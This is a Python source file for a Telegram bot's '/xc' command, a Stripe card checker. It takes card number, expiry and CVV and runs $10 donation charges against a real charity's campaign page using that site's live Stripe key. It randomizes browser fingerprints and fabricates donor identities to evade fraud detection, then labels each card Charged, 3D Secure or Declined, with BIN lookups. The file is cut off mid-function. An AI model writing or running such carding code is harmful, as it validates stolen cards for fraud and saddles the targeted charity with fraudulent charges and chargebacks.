# BOT/gates/charge/stripe/scharge.py


import json
import asyncio
import re
import time
import httpx
import random
import string
import logging
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
from BOT.helper.permissions import auth_and_free_restricted
from BOT.helper.start import load_users, save_users

# Import credit system and charge processor
try:
    from BOT.gc.credit import charge_processor, get_user_credits
    CREDIT_SYSTEM_AVAILABLE = True
except ImportError:
    CREDIT_SYSTEM_AVAILABLE = False
    print("⚠️ Credit system not available - using fallback")

# Custom logger with emoji formatting
class EmojiLogger:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.WARNING)
        self.logger.propagate = False

    def info(self, message):
        print(f"🔹 {message}")

    def success(self, message):
        print(f"✅ {message}")

    def warning(self, message):
        print(f"⚠️ {message}")

    def error(self, message):
        print(f"❌ {message}")

    def step(self, step_num, total_steps, message):
        print(f"🔸 [{step_num}/{total_steps}] {message}")

    def network(self, message):
        print(f"🌐 {message}")

    def card(self, message):
        print(f"💳 {message}")

    def stripe(self, message):
        print(f"🔄 {message}")

    def debug_response(self, message):
        print(f"🔧 {message}")

    def bin_info(self, message):
        print(f"🏦 {message}")

    def user(self, message):
        print(f"👤 {message}")

# Create global logger instance
logger = EmojiLogger()

# Suppress other loggers
logging.getLogger("pyrogram").setLevel(logging.ERROR)
logging.getLogger("httpx").setLevel(logging.ERROR)
logging.getLogger("httpcore").setLevel(logging.ERROR)
logging.getLogger("asyncio").setLevel(logging.ERROR)

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            config_data = json.load(f)
            return config_data.get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        return users[user_id_str].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        with open("DATA/banned_users.txt", "r") as f:
            banned_users = f.read().splitlines()
        return str(user_id) in banned_users
    except:
        return False

def check_cooldown(user_id, command_type="xc"):
    """Check cooldown for user - SKIP FOR OWNER"""
    # Get owner ID
    owner_id = load_owner_id()

    # Skip cooldown check for owner
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15)

        if antispam is None:
            antispam = 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0

class StripeChargeChecker:
    def __init__(self):
        # Modern browser user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36"
        ]
        self.user_agent = random.choice(self.user_agents)
        self.bin_cache = {}
        self.last_bin_request = 0
        self.base_url = "https://www.beitsahourusa.org"
        self.stripe_key = "pk_live_51HhefWFVQkom3lAfFiSCo1daFNqT2CegRXN4QedqlScZqZRP55JVTekqb4d68wMYUY4bfg8M9eJK8A3pou9EKdhW00QAVLLIdm"

        # Updated campaign details for Michigan Chapter
        self.campaign_id = "292"
        self.campaign_description = "Establishing Michigan Chapter"
        self.campaign_path = "/campaigns/establishing-michigan-chapter/"

        self.bin_services = [
            {
                'url': 'https://lookup.binlist.net/{bin}',
                'headers': {'Accept-Version': '3', 'User-Agent': self.user_agent},
                'name': 'binlist.net',
                'parser': self.parse_binlist_net
            },
            {
                'url': 'https://bins.antipublic.cc/bins/{bin}',
                'headers': {'User-Agent': self.user_agent},
                'name': 'antipublic.cc',
                'parser': self.parse_antipublic
            }
        ]

        # Generate random browser fingerprints
        self.generate_browser_fingerprint()

    def generate_browser_fingerprint(self):
        """Generate realistic browser fingerprints to bypass detection"""
        # Screen resolutions
        self.screen_resolutions = [
            "1920x1080", "1366x768", "1536x864", "1440x900", 
            "1280x720", "1600x900", "2560x1440", "3840x2160"
        ]

        # Timezones
        self.timezones = [
            "America/New_York", "America/Chicago", "America/Denver", 
            "America/Los_Angeles", "Europe/London", "Europe/Paris",
            "Asia/Tokyo", "Australia/Sydney"
        ]

        # Languages
        self.languages = [
            "en-US,en;q=0.9", "en-GB,en;q=0.8", "en-CA,en;q=0.9,fr;q=0.8",
            "en-AU,en;q=0.9", "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8"
        ]

        # Platform
        if "Windows" in self.user_agent:
            self.platform = "Win32"
            self.sec_ch_ua_platform = '"Windows"'
        elif "Macintosh" in self.user_agent:
            self.platform = "MacIntel"
            self.sec_ch_ua_platform = '"macOS"'
        elif "Linux" in self.user_agent:
            self.platform = "Linux x86_64"
            self.sec_ch_ua_platform = '"Linux"'
        elif "iPhone" in self.user_agent or "iPad" in self.user_agent:
            self.platform = "iPhone"
            self.sec_ch_ua_platform = '"iOS"'
        elif "Android" in self.user_agent:
            self.platform = "Linux armv8l"
            self.sec_ch_ua_platform = '"Android"'
        else:
            self.platform = "Win32"
            self.sec_ch_ua_platform = '"Windows"'

        # Randomize other fingerprint elements
        self.screen_resolution = random.choice(self.screen_resolutions)
        self.timezone = random.choice(self.timezones)
        self.accept_language = random.choice(self.languages)
        self.connection_type = random.choice(["keep-alive", "close"])

        # Generate Sec-CH-UA headers based on Chrome version
        chrome_version = re.search(r'Chrome/(\d+)', self.user_agent)
        if chrome_version:
            version = chrome_version.group(1)
            self.sec_ch_ua = f'"Not A;Brand";v="99", "Chromium";v="{version}", "Google Chrome";v="{version}"'
        else:
            self.sec_ch_ua = '"Not A;Brand";v="99", "Chromium";v="144", "Google Chrome";v="144"'

        # Generate Sec-CH-UA-Mobile
        self.sec_ch_ua_mobile = "?0" if "Mobile" not in self.user_agent else "?1"

    def get_country_emoji(self, country_code):
        """Hardcoded country emoji mapping"""
        country_emojis = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
            'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'RU': '🇷🇺', 'KR': '🇰🇷',
            'NL': '🇳🇱', 'CH': '🇨🇭', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
            'FI': '🇫🇮', 'PL': '🇵🇱', 'TR': '🇹🇷', 'AE': '🇦🇪', 'SA': '🇸🇦',
            'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭', 'ID': '🇮🇩', 'PH': '🇵🇭',
            'VN': '🇻🇳', 'BD': '🇧🇩', 'PK': '🇵🇰', 'NG': '🇳🇬', 'ZA': '🇿🇦',
            'EG': '🇪🇬'
        }
        return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')

    def get_base_headers(self):
        """Get undetectable base headers"""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': self.accept_language,
            'Cache-Control': 'max-age=0',
            'Connection': self.connection_type,
            'DNT': '1',
            'Sec-CH-UA': self.sec_ch_ua,
            'Sec-CH-UA-Mobile': self.sec_ch_ua_mobile,
            'Sec-CH-UA-Platform': self.sec_ch_ua_platform,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.user_agent,
            'Viewport-Width': self.screen_resolution.split('x')[0],
            'Width': self.screen_resolution.split('x')[0]
        }

    def parse_binlist_net(self, data):
        scheme = data.get('scheme', 'N/A').upper()
        if scheme == 'N/A':
            scheme = data.get('brand', 'N/A').upper()

        card_type = data.get('type', 'N/A').upper()
        brand = data.get('brand', 'N/A')
        bank_name = data.get('bank', {}).get('name', 'N/A').upper()
        country_name = data.get('country', {}).get('name', 'N/A')
        country_code = data.get('country', {}).get('alpha2', 'N/A')

        if country_name:
            country_name = country_name.replace('(the)', '').strip().upper()

        brand_display = brand.upper() if brand != 'N/A' else 'N/A'

        # Get flag emoji
        flag_emoji = self.get_country_emoji(country_code)

        return {
            'scheme': scheme,
            'type': card_type,
            'brand': brand_display,
            'bank': bank_name,
            'country': country_name,
            'country_code': country_code,
            'emoji': flag_emoji
        }

    def parse_antipublic(self, data):
        if isinstance(data, str):
            try:
                data = json.loads(data)
            except json.JSONDecodeError:
                return {
                    'scheme': 'N/A',
                    'type': 'N/A',
                    'brand': 'N/A',
                    'bank': 'N/A',
                    'country': 'N/A',
                    'country_code': 'N/A',
                    'emoji': '🏳️'
                }

        country_code = data.get('country', 'N/A')
        country_name = data.get('country_name', country_code)
        flag_emoji = data.get('country_flag', '🏳️')

        if country_name:
            country_name = country_name.replace('(the)', '').strip().upper()

        if flag_emoji == '🏳️' or flag_emoji == 'N/A':
            if country_code != 'N/A' and len(country_code) == 2:
                flag_emoji = self.get_country_emoji(country_code)

        return {
            'scheme': data.get('brand', 'N/A').upper(),
            'type': data.get('type', 'N/A').upper(),
            'brand': data.get('brand', 'N/A').upper(),
            'bank': data.get('bank', 'N/A').upper(),
            'country': country_name,
            'country_code': country_code,
            'emoji': flag_emoji
        }

    async def get_bin_info(self, cc):
        """Get BIN information with proper flag handling"""
        if not cc or len(cc) < 6:
            return {
                'scheme': 'N/A',
                'type': 'N/A',
                'brand': 'N/A',
                'bank': 'N/A',
                'country': 'N/A',
                'country_code': 'N/A',
                'emoji': '🏳️'
            }

        bin_number = cc[:6]

        # Check cache first
        if bin_number in self.bin_cache:
            return self.bin_cache[bin_number]

        # Rate limiting
        now = time.time()
        if now - self.last_bin_request < 1.0:
            await asyncio.sleep(1.0)
        self.last_bin_request = time.time()

        default_response = {
            'scheme': 'N/A',
            'type': 'N/A',
            'brand': 'N/A',
            'bank': 'N/A',
            'country': 'N/A',
            'country_code': 'N/A',
            'emoji': '🏳️'
        }

        # Try antipublic.cc first
        try:
            url = f"https://bins.antipublic.cc/bins/{bin_number}"
            headers = {'User-Agent': self.user_agent}

            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.get(url, headers=headers)

                if response.status_code == 200:
                    data = response.json()

                    if "detail" in data and "not found" in data["detail"].lower():
                        logger.warning(f"BIN {bin_number} not found in antipublic.cc")
                    else:
                        result = self.parse_antipublic(data)
                        self.bin_cache[bin_number] = result
                        return result
        except Exception as e:
            logger.warning(f"antipublic.cc failed: {e}")

        # Fallback to binlist.net
        for service in self.bin_services:
            if service['name'] == 'binlist.net':
                try:
                    url = service['url'].format(bin=bin_number)
                    headers = service['headers']

                    async with httpx.AsyncClient(timeout=10.0) as client:
                        response = await client.get(url, headers=headers)

                        if response.status_code == 200:
                            data = response.json()
                            result = service['parser'](data)

                            if result['emoji'] == '🏳️' and result['country_code'] != 'N/A':
                                better_flag = self.get_country_emoji(result['country_code'])
                                result['emoji'] = better_flag

                            self.bin_cache[bin_number] = result
                            return result
                except Exception as e:
                    logger.warning(f"binlist.net failed: {e}")
                    continue

        # If all fail, return default
        self.bin_cache[bin_number] = default_response
        return default_response

    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
        if bin_info is None:
            bin_info = await self.get_bin_info(cc)

        user_id = user_data.get("user_id", "Unknown")
        first_name = html.escape(user_data.get("first_name", "User"))
        badge = user_data.get("plan", {}).get("badge", "🎭")

        # Determine status based on message content (like in response.py)
        raw_message = str(message).lower()

        # Check for success patterns
        success_patterns = [
            "successfully charged",
            "thank you",
            "order placed",
            "approved",
            "success"
        ]

        # Check for 3D Secure patterns
        three_d_patterns = [
            "3d secure",
            "3ds",
            "requires_action",
            "authentication_required"
        ]

        # Check for decline patterns
        decline_patterns = [
            "declined",
            "failed",
            "error",
            "unsupported",
            "invalid"
        ]

        status_flag = "Declined ❌"
        status_emoji = "❌"

        if any(pattern in raw_message for pattern in success_patterns):
            status_flag = "Charged 💎"
            status_emoji = "💎"
        elif "3d secure❎" in raw_message.lower():
            status_flag = "3D Secure ❎"
            status_emoji = "❎"
        elif any(pattern in raw_message for pattern in three_d_patterns):
            status_flag = "3D Secure ❎"
            status_emoji = "❎"
        elif "approved" in status.lower():
            status_flag = "Approved ❎"
            status_emoji = "❎"

        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
        user_display = f"「{badge}」{clean_name}"
        bank_info = bin_info['bank'].upper() if bin_info['bank'] != 'N/A' else 'N/A'

        # Format response with /xc command name
        response = f"""<b>「$cmd → /xc」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Charge 10$ ♻️
<b>[•] Status-</b> <code>{status_flag}</code>
<b>[•] Response-</b> <code>{message}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin:</b> <code>{cc[:6]}</code>  
<b>[+] Info:</b> <code>{bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}</code>
<b>[+] Bank:</b> <code>{bank_info}</code> 🏦
<b>[+] Country:</b> <code>{bin_info['country']}</code> [{bin_info['emoji']}]
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By:</b> {user_display}
<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t:</b> <code>{elapsed_time:.2f} 𝐬</code> |<b>P/x:</b> <code>Live ⚡️</code></b>"""

        return response

    def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
        return f"""<b>「$cmd → /xc」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Charge 10$ ♻️
<b>[•] Status-</b> Processing... ⏳
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {user_plan}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>"""

    async def get_form_tokens(self, client):
        """Get form tokens from Michigan Chapter donation page"""
        try:
            logger.step(1, 4, "Loading Michigan Chapter donation page...")

            response = await client.get(
                f"{self.base_url}{self.campaign_path}",
                headers=self.get_base_headers()
            )

            if response.status_code != 200:
                return None, f"Failed to load page: {response.status_code}"

            html_text = response.text

            tokens = {}

            # Extract form ID
            form_id_match = re.search(r'name="charitable_form_id" value="([^"]+)"', html_text)
            if form_id_match:
                tokens['charitable_form_id'] = form_id_match.group(1)
                logger.success(f"Form ID: {tokens['charitable_form_id']}")
            else:
                return None, "No form ID found"

            # Extract donation nonce
            nonce_match = re.search(r'name="_charitable_donation_nonce" value="([^"]+)"', html_text)
            if nonce_match:
                tokens['donation_nonce'] = nonce_match.group(1)
                logger.success(f"Donation nonce: {tokens['donation_nonce']}")
            else:
                return None, "No donation nonce found"

            # Use the updated campaign ID for Michigan Chapter
            tokens['campaign_id'] = self.campaign_id
            logger.success(f"Campaign ID: {tokens['campaign_id']} (Michigan Chapter)")

            # Extract other required fields
            wp_referer_match = re.search(r'name="_wp_http_referer" value="([^"]+)"', html_text)
            tokens['_wp_http_referer'] = wp_referer_match.group(1) if wp_referer_match else self.campaign_path

            return tokens, None

        except Exception as e:
            logger.error(f"Token error: {str(e)}")
            return None, f"Token error: {str(e)}"

    async def create_stripe_payment_method(self, client, card_details, user_info):
        """Create Stripe payment method"""
        try:
            cc, mes, ano, cvv = card_details

            logger.step(2, 4, "Creating Stripe payment method...")

            # Generate realistic Stripe identifiers
            client_session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
            guid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
            muid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
            sid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))

            payment_data = {
                'type': 'card',
                'billing_details[name]': f"{user_info['first_name']} {user_info['last_name']}",
                'billing_details[email]': user_info['email'],
                'billing_details[address][postal_code]': '10080',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_month]': mes,
                'card[exp_year]': ano[-2:],
                'allow_redisplay': 'unspecified',
                'pasted_fields': 'number',
                'payment_user_agent': f'stripe.js/{random.choice(["eeaff566a9", "065b474d33"])}; stripe-js-v3/{random.choice(["eeaff566a9", "065b474d33"])}; card-element',
                'referrer': self.base_url,
                'time_on_page': str(random.randint(30000, 90000)),
                'client_attribution_metadata[client_session_id]': client_session_id,
                'guid': guid,
                'muid': muid,
                'sid': sid,
                'key': self.stripe_key,
                '_stripe_version': '2024-06-20'
            }

            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': self.user_agent,
                'sec-ch-ua': self.sec_ch_ua,
                'sec-ch-ua-mobile': self.sec_ch_ua_mobile,
                'sec-ch-ua-platform': self.sec_ch_ua_platform
            }

            logger.stripe("Sending request to Stripe API...")
            await asyncio.sleep(random.uniform(0.5, 1.5))

            response = await client.post(
                "https://api.stripe.com/v1/payment_methods",
                data=payment_data,
                headers=stripe_headers
            )

            logger.debug_response(f"Stripe response: {response.status_code}")

            if response.status_code == 200:
                result = response.json()
                payment_method_id = result.get('id')
                if payment_method_id:
                    logger.success(f"✅ Payment method created: {payment_method_id}")
                    return {'success': True, 'payment_method_id': payment_method_id}
                else:
                    return {'success': False, 'error': 'No payment method ID'}
            else:
                try:
                    error_data = response.json()
                    error_msg = error_data.get('error', {}).get('message', 'Payment method creation failed')

                    logger.error(f"Stripe error: {error_msg}")
                    return {'success': False, 'error': error_msg}
                except:
                    return {'success': False, 'error': 'Stripe API error'}

        except Exception as e:
            logger.error(f"Payment method error: {str(e)}")
            return {'success': False, 'error': f"Payment method error: {str(e)}"}

    async def submit_donation(self, client, tokens, payment_method_id, user_info):
        """Submit donation to Michigan Chapter and get real response"""
        try:
            logger.step(3, 4, "Submitting donation to Michigan Chapter...")

            donation_data = {
                'charitable_form_id': tokens['charitable_form_id'],
                tokens['charitable_form_id']: '',
                '_charitable_donation_nonce': tokens['donation_nonce'],
                '_wp_http_referer': tokens['_wp_http_referer'],
                'campaign_id': tokens['campaign_id'],
                'description': self.campaign_description,
                'ID': '0',
                'custom_donation_amount': '10.00',
                'recurring_donation': 'once',  # Added based on the payload
                'first_name': user_info['first_name'],
                'last_name': user_info['last_name'],
                'email': user_info['email'],
                'additiona_message': 'Support our cause and help those in need',
                'anonymous_donation': '1',
                'gateway': 'stripe',
                'stripe_payment_method': payment_method_id,
                'cover_fees': '1',
                'action': 'make_donation',
                'form_action': 'make_donation'
            }

            donation_headers = {
                **self.get_base_headers(),
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": self.base_url,
                "Referer": f"{self.base_url}{self.campaign_path}",
                "Cookie": f"__stripe_mid={''.join(random.choices(string.ascii_lowercase + string.digits, k=32))}; charitable_session={''.join(random.choices('0123456789abcdef', k=32))}; __stripe_sid={''.join(random.choices(string.ascii_lowercase + string.digits, k=32))}"
            }

            logger.network(f"Using payment method: {payment_method_id}")

            response = await client.post(
                f"{self.base_url}/wp-admin/admin-ajax.php",
                data=donation_data,
                headers=donation_headers
            )

            logger.debug_response(f"Donation response: {response.status_code}")

            if response.status_code != 200:
                return {
                    'success': False,
                    'status': 'DECLINED',
                    'message': f"Server error: {response.status_code}"
                }

            # Try to parse as JSON first
            try:
                result = response.json()
                logger.debug_response(f"JSON Response: {json.dumps(result, indent=2)}")

                if isinstance(result, dict):
                    # Check for REAL 3D Secure (requires_action = real 3D Secure)
                    if result.get('requires_action') is True:
                        logger.success("🔐 REAL 3D Secure detected (requires_action)")
                        return {
                            'success': True,
                            'status': 'DECLINED',
                            'message': '3D SECURE❎'
                        }

                    if result.get('success') is True:
                        # Check if there's a redirect URL (real success)
                        if 'redirect_to' in result and not result.get('requires_action'):
                            redirect_url = result['redirect_to']
                            logger.success(f"✅ Real success with redirect: {redirect_url}")
                            return {
                                'success': True,
                                'status': 'APPROVED',
                                'message': 'Successfully Charged'
                            }
                        else:
                            # Success without redirect - check if there are any errors
                            if 'errors' in result and result['errors']:
                                error_msg = result['errors'][0]
                                logger.warning(f"❌ Success but has errors: {error_msg}")
                                return {
                                    'success': False,
                                    'status': 'DECLINED',
                                    'message': error_msg
                                }
                            else:
                                logger.success("✅ Success without redirect")
                                return {
                                    'success': True,
                                    'status': 'APPROVED',
                                    'message': 'Successfully Charged'
                                }
                    else:
                        # Explicit failure in JSON
                        if 'errors' in result and result['errors']:
                            error_msg = result['errors'][0]
                            error_msg = re.sub(r'<[^>]+>', '', error_msg).strip()

                            # Check if this is REAL 3D Secure in error message
                            if "3d_secure" in error_msg.lower() or "authentication_required" in error_msg.lower():
                                logger.success("🔐 REAL 3D Secure detected in error")
                                return {
                                    'success': True,
                                    'status': 'DECLINED',
                                    'message': '3D SECURE❎'
                                }

                            logger.warning(f"❌ JSON error: {error_msg}")
                            return {
                                'success': False,
                                'status': 'DECLINED',
                                'message': error_msg
                            }
                        else:
                            logger.warning("❌ Generic JSON decline")
                            return {
                                'success': False,
                                'status': 'DECLINED',
                                'message': 'Payment declined'
                            }
                else:
                    logger.error("Unexpected JSON format")
                    return {
                        'success': False,
                        'status': 'DECLINED',
                        'message': 'Unexpected response format'
                    }

            except json.JSONDecodeError:
                # If not JSON, it's HTML - this means JavaScript requirement
                html_response = response.text
                logger.warning("Response is HTML - JavaScript requirement detected")

                # Check for specific JavaScript error message
                if 'Javascript' in html_response or 'javascript' in html_response:
                    logger.error("❌ JavaScript required - cannot process")
                    return {
                        'success': False,
                        'status': 'DECLINED',
                        'message': 'JavaScript required - payment cannot be processed'
                    }

                # Check for other error messages in HTML
                decline_message = self.extract_decline_message(html_response)
                if decline_message:
                    logger.warning(f"❌ HTML decline message: {decline_message}")
                    return {
                        'success': False,
                        'status': 'DECLINED',
                        'message': decline_message
                    }
                else:
                    logger.warning("❌ Generic HTML decline")
                    return {
                        'success': False,
                        'status': 'DECLINED',
                        'message': 'Payment declined'
                    }

        except Exception as e:
            logger.error(f"Donation submission error: {str(e)}")
            return {
                'success': False,
                'status': 'DECLINED',
                'message': f"Processing error: {str(e)}"
            }

    def extract_decline_message(self, html):
        """Extract decline message from HTML"""
        try:
            patterns = [
                r'Your card was declined[^<]*',
                r'declined[^<.!?]*[.!?]',
                r'insufficient funds[^<]*',
                r'card does not support[^<]*',
                r'security code.*incorrect[^<]*',
                r'contact your card issuer[^<]*',
                r'authentication is not available[^<]*',
                r'this card type is not accepted[^<]*',
                r'card not supported[^<]*',
                r'unsupported card[^<]*'
            ]

            for pattern in patterns:
                matches = re.findall(pattern, html, re.IGNORECASE)
                for match in matches:
                    if match and len(match.strip()) > 5:
                        return match.strip()

            return None
        except:
            return None

    async def check_card(self, card_details, username, user_data):
        """Main card checking method - called by ChargeCommandProcessor"""
        start_time = time.time()
        cc, mes, ano, cvv = "", "", "", ""
        client = None

        try:
            logger.info(f"🔍 Starting Stripe Charge check: {card_details[:12]}XXXX{card_details[-4:] if len(card_details) > 4 else ''}")

            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                return await self.format_response("", "", "", "", "ERROR", "Invalid card format. Use: CC|MM|YY|CVV", username, time.time()-start_time, user_data)

            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            # Validate card details
            if not cc.isdigit() or len(cc) < 15:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid card number", username, time.time()-start_time, user_data)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid month", username, time.time()-start_time, user_data)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid year", username, time.time()-start_time, user_data)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid CVV", username, time.time()-start_time, user_data)

            if len(ano) == 2:
                ano = '20' + ano

            # Get BIN info with proper flag handling
            bin_info = await self.get_bin_info(cc)
            logger.bin_info(f"BIN: {cc[:6]} | {bin_info['scheme']} - {bin_info['type']} | {bin_info['bank']} | {bin_info['country']} [{bin_info['emoji']}]")

            # Generate user details
            first_names = ["John", "Jane", "Robert", "Mary", "David", "Sarah", "Michael", "Lisa", "James", "Emma"]
            last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]

            first_name = random.choice(first_names)
            last_name = random.choice(last_names)
            domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]
            domain = random.choice(domains)
            email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1000,9999)}@{domain}"

            user_info = {
                'first_name': first_name,
                'last_name': last_name,
                'email': email
            }

            logger.user(f"User: {first_name} {last_name} | {email}")

            # Create HTTP client
            client = httpx.AsyncClient(
                timeout=30.0,
                follow_redirects=True,
                limits=httpx.Limits(max_keepalive_connections=5, max_connections=10),
                http2=True
            )

            # Step 1: Get form tokens
            tokens, error = await self.get_form_tokens(client)
            if not tokens:
                await client.aclose()
                return await self.format_response(cc, mes, ano, cvv, "ERROR", error, username, time.time()-start_time, user_data, bin_info)

            # Step 2: Create payment method
            payment_result = await self.create_stripe_payment_method(client, (cc, mes, ano, cvv), user_info)
            if not payment_result['success']:
                await client.aclose()
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", payment_result['error'], username, time.time()-start_time, user_data, bin_info)

            # Step 3: Submit donation
            result = await self.submit_donation(client, tokens, payment_result['payment_method_id'], user_info)

            await client.aclose()

            elapsed_time = time.time() - start_time
            logger.success(f"Card check completed in {elapsed_time:.2f}s - Status: {result['status']}")

            return await self.format_response(cc, mes, ano, cvv, result['status'], result['message'], username, elapsed_time, user_data, bin_info)

        except httpx.TimeoutException:
            logger.error("Request timeout")
            if client:
                await client.aclose()
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, time.time()-start_time, user_data)
        except httpx.ConnectError:
            logger.error("Connection error")
            if client:
                await client.aclose()
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed", username, time.time()-start_time, user_data)
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}")
            if client:
                await client.aclose()
            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)[:80]}", username, time.time()-start_time, user_data)

# Command handler for /xc command only
@Client.on_message(filters.command(["xc", ".xc", "$xc"]))
@auth_and_free_restricted
async def handle_stripe_charge(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        # Check if command is disabled
        try:
            from BOT.helper.Admins import is_command_disabled, get_command_offline_message
            command_text = message.text.split()[0]
            command_name = command_text.lstrip('/.$')

            if is_command_disabled(command_name):
                await message.reply(get_command_offline_message(command_text))
                return
        except ImportError:
            pass

        if is_user_banned(user_id):
            await message.reply("""<pre>⛔ User Banned</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You have been banned from using this bot.
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>🔒 Registration Required</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You need to register first with /register
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

